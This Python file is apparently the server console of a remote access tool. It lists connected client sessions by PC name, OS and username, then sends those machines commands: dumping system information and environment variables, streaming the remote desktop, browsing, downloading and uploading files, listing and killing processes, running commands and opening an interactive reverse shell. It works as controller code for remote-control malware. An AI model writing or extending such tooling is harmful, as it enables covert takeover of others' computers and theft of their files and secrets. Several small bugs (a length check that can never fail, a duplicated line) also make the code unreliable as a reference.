import os
import signal
import sys
import threading

from server.app_concurrent.events.events import Subject, AppEvent, Action, Target
from shared.net_lib.packets.packet import PacketType, PacketProcess, PacketShell
from server.ui.console.views.filesystem_view import FileSystemView
from server.ui.console.views.main_view import MainView
from server.ui.console.views.process_view import ProcessView


class ConsoleUiMediator:
    def __init__(self, channel):
        self.running = False
        self.channel = channel
        self.app_events_listener = threading.Thread(target=self.listen_app_events)
        self.current_view = None

        self.fs_view = FileSystemView(self)
        self.main_view = MainView(self)
        self.ps_view = ProcessView(self)

        self.interacting = False
        self.client_id = None

        self.waiting_desktop_images = False
        self.shell_active = False

    def start_async(self):
        self.running = True
        self.current_view = self.main_view
        self.app_events_listener.start()

    def main_loop(self):
        self.running = True
        self.setup_ctrl_handler()

        while self.running:
            line = self.current_view.loop()
            if line is None:
                pass
            if line == 'quit':
                self.running = False
                # Try to handle the instruction
            if not self.process_instruction(line):
                # If we could not handle it, forward it to app
                event = self.parse_instruction(line.lower())
                self.channel.post_to_app(event)

    def process_instruction(self, instruction):
        if instruction:
            parts = instruction.split(' ')
            if not self.interacting:
                if parts[0] == 'help':
                    print("Commands:")
                    print("ls - List available sessions")
                    return True

                if instruction.startswith('interact'):
                    if len(parts) == 2:
                        self.interacting = True
                        self.client_id = int(parts[1])
                        self.current_view.client_id = self.client_id
                        return True

            else:
                if parts[0] == 'help':
                    print("Commands: ")
                    print("sysinfo - Retrieves the client system information")
                    print("rdesktop start - Starts a Remote Desktop Streaming session")
                    print("ls [path] - retrieves the list of files, if path is empty, then retrieves roots")
                    print("ps - Retrieves the list processes running on the client system")
                    print("download path - Downloads a file from the given url "
                          "and saves it into path(temp by default)")
                    print("upload path - Upload a file from this system to the client")
                    print("exec [path] - Executes a file in the remote system, "
                          "if path is empty starts new reverse shell")
                    print("shell - Starts a new reverse shell session")

                    print(self.current_view.get_name())
                    self.current_view.print_help(prefix='\t')

                    return True

                elif parts[0] == 'fs' and (len(parts) == 1 or (len(parts) > 1 and parts[1] == 'start')):
                    self.current_view = self.fs_view
                    self.fs_view.client_id = self.client_id
                    return True
        return False

    def parse_instruction(self, instruction):
        if instruction:
            parts = instruction.split(' ')
            if self.interacting:
                if self.shell_active:
                    # If reverse shell active forward everything to the remote shell
                    return AppEvent(target=Target.Client, subject=Subject.Shell, action=Action.Post,
                                    object_data={'client_id': self.current_view.client_id, 'command': instruction,
                                                 'shell': True})
                elif instruction == 'sysinfo':
                    return AppEvent(target=Target.Client, subject=Subject.ClientInformation, action=Action.Get,
                                    object_data={'client_id': self.current_view.client_id})

                elif instruction == 'rdesktop start' and not self.waiting_desktop_images:
                    self.waiting_desktop_images = True
                    return AppEvent(target=Target.Client, subject=Subject.Desktop, action=Action.Start,
                                    object_data={'client_id': self.current_view.client_id})

                elif instruction == 'rdesktop stop' and self.waiting_desktop_images:
                    self.waiting_desktop_images = False
                    return AppEvent(target=Target.Client, subject=Subject.Desktop, action=Action.Stop,
                                    object_data={'client_id': self.current_view.client_id})

                elif parts[0] == 'ls':
                    path = None
                    if len(parts) > 1:
                        path = parts[1]

                    # If we are in FileSystem View append path to current directory
                    if self.current_view == self.fs_view:
                        path = self.fs_view.join_path(path)

                    return AppEvent(target=Target.Client, subject=Subject.FileSystem, action=Action.Get,
                                    object_data={'client_id': self.current_view.client_id, 'path': path})

                elif parts[0] == 'fs':
                    if len(parts) == 1:
                        raise AssertionError("Expected more than one argument")

                elif parts[0] == 'download':
                    if len(parts) < 1:
                        print('You must specify the path of the file to download')
                        return None

                    path = parts[1]

                    if self.current_view == self.fs_view:
                        path = self.fs_view.join_path(path)

                    return AppEvent(target=Target.Client, subject=Subject.FileSystem, action=Action.Get,
                                    object_data={'client_id': self.current_view.client_id, 'path': path})

                elif parts[0] == 'upload':
                    if len(parts) > 1:
                        path = parts[1]
                        return AppEvent(target=Target.Client, subject=Subject.FileSystem, action=Action.Post,
                                        object_data={'client_id': self.current_view.client_id, 'path': path})

                elif parts[0] == 'ps':
                    return AppEvent(target=Target.Client, subject=Subject.Process, action=Action.Get,
                                    object_data={'client_id': self.current_view.client_id})

                elif parts[0] == 'pskill':
                    if len(parts) > 1:
                        pid = int(parts[1])
                        return AppEvent(target=Target.Client, subject=Subject.Process, action=Action.Stop,
                                        object_data={'client_id': self.current_view.client_id, 'pid': pid})

                # Execute command, don't pipe the process
                elif parts[0] == 'exec':
                    if len(parts) > 1:
                        command = parts[1]
                        command = parts[1]

                        return AppEvent(target=Target.Client, subject=Subject.Shell, action=Action.Post,
                                        object_data={'client_id': self.current_view.client_id, 'command': command})

                # Execute command, pipe the process
                elif parts[0] == 'pexec':
                    if len(parts) > 1:
                        command = parts[1]
                        return AppEvent(target=Target.Client, subject=Subject.Shell, action=Action.Post,
                                        object_data={'client_id': self.current_view.client_id, 'command': command})

                elif parts[0] == 'shell':
                    self.shell_active = True
                    return AppEvent(target=Target.Client, subject=Subject.Shell, action=Action.Start,
                                    object_data={'client_id': self.current_view.client_id})

            elif instruction == 'ls' or instruction == 'list sessions':
                return AppEvent(target=Target.Server, subject=Subject.Connection, action=Action.Get)

        return None

    def listen_app_events(self):
        while self.running:
            event = self.channel.take_from_app()
            if event is None:
                continue

            target = event.target
            subject = event.subject
            action = event.action
            event_object = event.object_data
            if target == Target.Server:
                if subject == Subject.Connection:
                    if action == Action.Get:
                        # this corresponds to list sessions or ls in MainView
                        clients = event_object
                        print('\n===================================================')
                        print('Available sessions(%s)' % len(clients))
                        print('===================================================')
                        for client in clients:
                            print('Client(%s):\n\tPc name: %s\n\tOperating System: %s\n\tUsername: %s\n'
                                  % (client['client_id'], client['pc_name'], client['os_name'],
                                     client['username']))
                        self.current_view.print_banner()

            elif event.target == Target.Client:
                self.handle_client_event(event.client, subject, action, event_object)

            elif event.target == Target.Ui:
                print(event_object['message'])
                self.current_view.print_banner()

    def interact(self, client_id):
        self.interacting = True
        self.client_id = client_id
        self.main_view.client_id = client_id

    def setup_ctrl_handler(self):
        def ctrl_handler():
            pass

        signal.signal(signal.SIGINT, ctrl_handler)

    def handle_client_event(self, client, subject, action, object_data):
        client_id = client['client_id']

        if subject == Subject.Connection:
            if action == Action.Stop and client_id == self.client_id:
                self.current_view = self.main_view
                self.client_id = None
                self.main_view.client_id = None
                self.interacting = False
                self.shell_active = False
                self.waiting_desktop_images = False
                print("\nClient disconnected, back to home view")
                self.main_view.print_banner()

        elif subject == Subject.PacketReceived:
            self.handle_packet_received(client, subject, action, object_data)

    def handle_packet_received(self, client, subject, action, object_data):
        client_id = client['client_id']
        packet = object_data
        if packet.packet_type == PacketType.PACKET_TYPE_PRESENTATION:
            sys.stdout.write('New Connection\n\tClient Id: %s\n\tPcName: %s'
                             '\n\tOperating System: %s'
                             '\n\tUsername: %s\n'
                             % (client['client_id'], packet.pc_name, packet.os_name, packet.username))

            # To speed up manual testing, the first connection gets interaction
            self.interact(client_id)
            self.current_view.print_banner()

        elif packet.packet_type == PacketType.PACKET_TYPE_INFORMATION:
            env = packet.info['env']
            py_version = packet.info['py_version']
            arch = packet.info['arch']

            print('\n============================================')
            print('User Information for %s\n' % client['pc_name'])
            print('============================================')
            print('\tPython version: %s' % py_version)
            print('\tArchitecture: %s' % arch)
            print('\tEnvironment variables')

            if env is not None:
                for key in env.keys():
                    print('\t\t%s: %s' % (key, env[key]))

            self.current_view.print_banner()
        elif packet.packet_type == PacketType.PACKET_TYPE_FILESYSTEM:
            if packet.success:
                if packet.path is None:
                    self.fs_view.print_fs_roots(client, packet.list_dir)
                else:
                    self.fs_view.print_client_ls(client, packet.path, packet.list_dir)
            else:
                self.current_view.print_error_message(packet.error_message)

            self.current_view.print_banner()
        elif packet.packet_type == PacketType.PACKET_TYPE_DESKTOP:
            image = packet.image
            dir_path = 'streaming/%s/desktop/' % client_id
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
            image.save('streaming/%s/desktop/image.png' % client_id)

        elif packet.packet_type == PacketType.PACKET_TYPE_PROCESS:
            if packet.ps_action == PacketProcess.Actions.List:
                ProcessView.print_process_list(client=client, processes=packet.processes)
            elif packet.ps_action == PacketProcess.Actions.Kill:
                if not packet.success:
                    self.current_view.print_error_message(getattr(packet, 'error_message', 'Unknown error'))
            self.current_view.print_banner()

        elif packet.packet_type == PacketType.PACKET_TYPE_SHELL:
            if packet.shell_action == PacketShell.Actions.Interactive:
                # self.current_view = self.ps_view
                self.ps_view.print_shell_data(packet.data)
            elif packet.shell_action == PacketShell.Actions.Stop:
                print('Shell exited')
                self.shell_active = False
                self.current_view.print_banner()

            elif packet.shell_action == PacketShell.Actions.ExecPiped:
                ProcessView.print_process_output(packet.data)
